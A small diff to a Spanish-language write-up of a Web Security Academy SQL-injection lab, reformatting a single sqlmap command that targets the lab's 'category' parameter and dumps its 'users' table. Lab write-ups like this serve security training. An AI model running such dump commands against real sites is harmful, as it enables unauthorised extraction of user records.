@@ -67,7 +67,8 @@ La herramienta `sqlmap` condensa variadas técnicas de ataque para SQLi contempl
 En este laboratorio, basta indicarle a `sqlmap` (por comando instalado o su *script* de Python) cual es la URL objetivo y el punto de inyección (parámetro). Una ejecución que lleva al mismo resultado sería la siguiente:
 
 ```bash
-sqlmap -u "https://LAB-ID.web-security-academy.net/filter?category=Pets" -p category -T users --ignore-code=500 --dump
+sqlmap -u "https://LAB-ID.web-security-academy.net/filter?category=Pets" \
+    -p category -T users --ignore-code=500 --dump
 ```
 
 Donde:
